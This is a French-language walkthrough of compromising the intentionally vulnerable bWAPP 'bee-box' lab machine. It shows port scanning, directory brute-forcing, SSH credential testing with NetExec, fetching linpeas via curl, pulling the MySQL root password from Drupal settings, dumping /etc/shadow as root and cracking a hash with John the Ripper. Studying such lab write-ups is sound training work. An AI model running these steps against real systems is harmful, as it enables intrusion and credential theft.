1.  <ins>Énumération</ins>

**<span style="color: #dddddd;">👁️</span> Nmap & Masscan**

```
┌─[parrot@windows]─[~/Desktop]
└──╼ $sudo sh massap.sh
[sudo] password for parrot: 
Entrer une IP: 192.168.56.104
Entrer un rate: 1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-07 08:19:47 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 08:22 GMT           
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:22
Completed NSE at 08:22, 10.02s elapsed
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Initiating ARP Ping Scan at 08:22
Scanning 192.168.56.104 [1 port]
Completed ARP Ping Scan at 08:22, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:22
Completed Parallel DNS resolution of 1 host. at 08:22, 0.00s elapsed
Initiating SYN Stealth Scan at 08:22
Scanning 192.168.56.104 [19 ports]
Discovered open port 3306/tcp on 192.168.56.104
Discovered open port 139/tcp on 192.168.56.104
Discovered open port 22/tcp on 192.168.56.104
Discovered open port 80/tcp on 192.168.56.104
Discovered open port 8080/tcp on 192.168.56.104
Discovered open port 443/tcp on 192.168.56.104
Discovered open port 21/tcp on 192.168.56.104
Discovered open port 25/tcp on 192.168.56.104
Discovered open port 445/tcp on 192.168.56.104
Discovered open port 9443/tcp on 192.168.56.104
Discovered open port 3632/tcp on 192.168.56.104
Discovered open port 666/tcp on 192.168.56.104
Discovered open port 6001/tcp on 192.168.56.104
Discovered open port 9080/tcp on 192.168.56.104
Discovered open port 513/tcp on 192.168.56.104
Discovered open port 5901/tcp on 192.168.56.104
Discovered open port 512/tcp on 192.168.56.104
Discovered open port 8443/tcp on 192.168.56.104
Discovered open port 514/tcp on 192.168.56.104
Completed SYN Stealth Scan at 08:22, 0.05s elapsed (19 total ports)
Initiating Service scan at 08:22
Scanning 19 services on 192.168.56.104
```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Rien d’intéressant

```
┌─[parrot@windows]─[~]
└──╼ $nxc ftp $ip -u '' -p '' --ls
FTP         192.168.56.104  21     192.168.56.104   [*] Banner: ProFTPD 1.3.1 Server (bee-box) [192.168.56.104]
FTP         192.168.56.104  21     192.168.56.104   [+] : - Anonymous Login!
FTP         192.168.56.104  21     192.168.56.104   [*] Directory Listing
FTP         192.168.56.104  21     192.168.56.104   -rw-rw-r--   1 root     www-data   543803 Nov  2  2014 Iron_Man.pdf
FTP         192.168.56.104  21     192.168.56.104   -rw-rw-r--   1 root     www-data   462949 Nov  2  2014 Terminator_Salvation.pdf
FTP         192.168.56.104  21     192.168.56.104   -rw-rw-r--   1 root     www-data   544600 Nov  2  2014 The_Amazing_Spider-Man.pdf
FTP         192.168.56.104  21     192.168.56.104   -rw-rw-r--   1 root     www-data   526187 Nov  2  2014 The_Cabin_in_the_Woods.pdf
FTP         192.168.56.104  21     192.168.56.104   -rw-rw-r--   1 root     www-data   756522 Nov  2  2014 The_Dark_Knight_Rises.pdf
FTP         192.168.56.104  21     192.168.56.104   -rw-rw-r--   1 root     www-data   618117 Nov  2  2014 The_Incredible_Hulk.pdf
FTP         192.168.56.104  21     192.168.56.104   -rw-rw-r--   1 root     www-data  5010042 Nov  2  2014 bWAPP_intro.pdf

```

&nbsp;

**<span style="color: #dddddd;">💣</span> Gobuster**

![bee-app](https://github.com/user-attachments/assets/70464229-50a5-410f-abb7-63a7d3f48913)


&nbsp;

On va voir ce qui ce cache derrière le répertoire `bWAPP`

```
┌─[parrot@windows]─[~/.manspider/loot]
└──╼ $gobuster dir -u http://192.168.56.104/bWAPP -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.104/bWAPP
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 387]
/.htpasswd            (Status: 403) [Size: 387]
/admin                (Status: 301) [Size: 412] [--> http://192.168.56.104/bWAPP/admin/]
/aim                  (Status: 200) [Size: 9957]
/apps                 (Status: 301) [Size: 411] [--> http://192.168.56.104/bWAPP/apps/]
/backdoor             (Status: 200) [Size: 339]
/bugs                 (Status: 200) [Size: 7858]
/captcha              (Status: 302) [Size: 0] [--> login.php]
/cgi-bin/             (Status: 403) [Size: 386]
/connect              (Status: 200) [Size: 0]
/credits              (Status: 302) [Size: 0] [--> login.php]
/db                   (Status: 301) [Size: 409] [--> http://192.168.56.104/bWAPP/db/]
/documents            (Status: 301) [Size: 416] [--> http://192.168.56.104/bWAPP/documents/]
/fonts                (Status: 301) [Size: 412] [--> http://192.168.56.104/bWAPP/fonts/]
/images               (Status: 301) [Size: 413] [--> http://192.168.56.104/bWAPP/images/]
/index                (Status: 302) [Size: 0] [--> portal.php]
/info                 (Status: 200) [Size: 3426]
/install              (Status: 200) [Size: 2270]
/js                   (Status: 301) [Size: 409] [--> http://192.168.56.104/bWAPP/js/]
/login                (Status: 200) [Size: 4019]
/logout               (Status: 302) [Size: 0] [--> login.php]
/logs                 (Status: 301) [Size: 411] [--> http://192.168.56.104/bWAPP/logs/]
/message              (Status: 200) [Size: 28]
/passwords            (Status: 301) [Size: 416] [--> http://192.168.56.104/bWAPP/passwords/]
/phpinfo              (Status: 200) [Size: 50606]
/portal               (Status: 200) [Size: 5396]
/reset                (Status: 302) [Size: 0] [--> login.php]
/robots               (Status: 200) [Size: 167]
/robots.txt           (Status: 200) [Size: 167]
/secret               (Status: 302) [Size: 0] [--> login.php]
/security             (Status: 302) [Size: 0] [--> login.php]
/soap                 (Status: 301) [Size: 411] [--> http://192.168.56.104/bWAPP/soap/]
/stylesheets          (Status: 301) [Size: 418] [--> http://192.168.56.104/bWAPP/stylesheets/]
/test                 (Status: 200) [Size: 0]
/training             (Status: 200) [Size: 3843]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

Le répertoire `passwords` a l’air intéressant

![dir_passwords](https://github.com/user-attachments/assets/1da44774-8994-4a9e-bc5c-3cf8e9c87bdc)


&nbsp;

Allons voir le fichier `heroes.xml`

![heroes](https://github.com/user-attachments/assets/abccd58c-01dc-4133-b1fe-2124c939d76b)


&nbsp;

On va tester ses login en SSH

```
┌─[parrot@windows]─[~]
└──╼ $nxc ssh 192.168.56.104 -u user -p pass --no-bruteforce --continue-on-success
SSH         192.168.56.104  22     192.168.56.104   [*] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
SSH         192.168.56.104  22     192.168.56.104   [+] neo:trinity  Linux - Shell access!
SSH         192.168.56.104  22     192.168.56.104   [+] alice:loveZombies  Linux - Shell access!
SSH         192.168.56.104  22     192.168.56.104   [+] thor:Asgard  Linux - Shell access!
SSH         192.168.56.104  22     192.168.56.104   [+] wolverine:Log@N  Linux - Shell access!
SSH         192.168.56.104  22     192.168.56.104   [+] johnny:m3ph1st0ph3l3s  Linux - Shell access!
SSH         192.168.56.104  22     192.168.56.104   [+] selene:m00n  Linux - Shell access!
```

&nbsp;

Utilisons linpeas pour devenir `root`

```
selene@bee-box:~$ curl -O 192.168.56.102:8080/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  828k  100  828k    0     0  29.1M      0 --:--:-- --:--:-- --:--:-- 35.1M
```

&nbsp;

On a le mot de passe root de la base de donnée MySQL `drupageddon`

```
selene@bee-box:~$ sh linpeas.sh

╔══════════╣ Analyzing Drupal Files (limit 70)
-rwxrwxrwx 1 root www-data 23497 2014-11-02 17:26 /var/www/drupal/sites/default/settings.php
 *   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 *   'port' => 3306,
 *   'prefix' => 'myprefix_',
 *   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 *   'prefix' => 'main_',
 * by using the 'prefix' setting. If a prefix is specified, the table
 * To have all database names prefixed, set 'prefix' as a string:
 *   'prefix' => 'main_',
 * To provide prefixes for specific tables, set 'prefix' as an array.
 *   'prefix' => array(
 *   'prefix' => array(
 *     'driver' => 'mysql',
 *     'database' => 'databasename',
 *     'username' => 'username',
 *     'password' => 'password',
 *     'host' => 'localhost',
 *     'prefix' => '',
 *     'driver' => 'pgsql',
 *     'database' => 'databasename',
 *     'username' => 'username',
 *     'password' => 'password',
 *     'host' => 'localhost',
 *     'prefix' => '',
 *     'driver' => 'sqlite',
 *     'database' => '/path/to/databasefilename',
      'database' => 'drupageddon',
      'username' => 'root',
      'password' => 'bug',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
 *   $drupal_hash_salt = file_get_contents('/home/example/salt.txt');
$drupal_hash_salt = '_QQd2KF0iUznXiEWMMUhQ7wboIsgdbkt_wSy4KjCkqs';


```

&nbsp;

On peut donc se connecter a `phpmyadmin` en tant que `root`

![phpmyadmin](https://github.com/user-attachments/assets/29b2fe14-2dc9-4c26-a6ee-debd8fe6f350)

&nbsp;

<span style="color: #dddddd;">🖥️</span> **NetExec**

Tester ensuite en `SSH`

```
┌─[parrot@windows]─[~/Desktop]
└──╼ $nxc ssh 192.168.56.104 -u root -p bug
SSH         192.168.56.104  22     192.168.56.104   [*] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
SSH         192.168.56.104  22     192.168.56.104   [+] root:bug (Pwn3d!) Linux - Shell access!
```

&nbsp;

On dump les user du fichier `shadow`

```
┌─[parrot@windows]─[~/Desktop]
└──╼ $nxc ssh 192.168.56.104 -u root -p bug -x 'cat /etc/shadow'
SSH         192.168.56.104  22     192.168.56.104   [*] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
SSH         192.168.56.104  22     192.168.56.104   [+] root:bug (Pwn3d!) Linux - Shell access!
SSH         192.168.56.104  22     192.168.56.104   [+] Executed command
SSH         192.168.56.104  22     192.168.56.104   root:$1$6.aigTP1$FC1TuoITEYSQwRV0hi6gj/:15792:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   daemon:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   bin:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   sys:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   sync:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   games:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   man:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   lp:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   mail:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   news:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   uucp:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   proxy:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   www-data:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   backup:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   list:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   irc:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   gnats:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   nobody:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   libuuid:!:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   dhcp:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   syslog:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   klog:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   hplip:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   avahi-autoipd:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   gdm:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   pulse:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   messagebus:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   avahi:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   polkituser:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   haldaemon:*:13991:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   bee:$1$tJB0ndAJ$0d42BkRQ7vebj/bE5RdQH1:15792:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   mysql:!:15792:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   sshd:*:15792:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   dovecot:*:15792:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   smmta:*:15792:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   smmsp:*:15792:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   neo:$1$fSorv0ad$56lfF9qd8o4caaSB6dVqi/:15897:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   alice:$1$yRUOVrYB$9f4TMaym/xOSeGbmsgFGI/:15897:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   thor:$1$Iy6Mvuaz$FzcNXTQ668kDD5LY.ObdL/:15897:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   wolverine:$1$PUGlrXi8$oXOwDBaAzxtgXh10Xkw9i/:15897:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   johnny:$1$uqzKnduQ$MPxhWXcf2FFQarhO95d5y/:15897:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   selene:$1$BHZLob3h$mru35IhZzRdnfTHOADrkJ0:15897:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   postfix:*:15901:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   proftpd:!:16051:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   ftp:*:16051:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   snmp:*:16178:0:99999:7:::
SSH         192.168.56.104  22     192.168.56.104   ntp:*:16178:0:99999:7:::

```

&nbsp;

**🧨 JohnTheRipper**

`bee` est le seul user dons nous avons pas le mot de passe

```
┌─[parrot@windows]─[~/Desktop]
└──╼ $john hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 11 candidates buffered for the current salt, minimum 12 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
bug              (bee)     
1g 0:00:00:11 DONE 3/3 (2025-01-07 13:30) 0.08936g/s 20730p/s 20730c/s 20730C/s 184..1214
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌─[parrot@windows]─[~/Desktop]
└──╼ $john --show hash
bee:bug:15792:0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

Cred trouver

| User | Password |
| --- | --- |
| bee | bug |
| root | bug |
| neo | trinity |
| alice | loveZombies |
| thor | Asgard |
| wolverine | Log@N |
| johnny | m3ph1st0ph3l3s |
| selene | m00n |
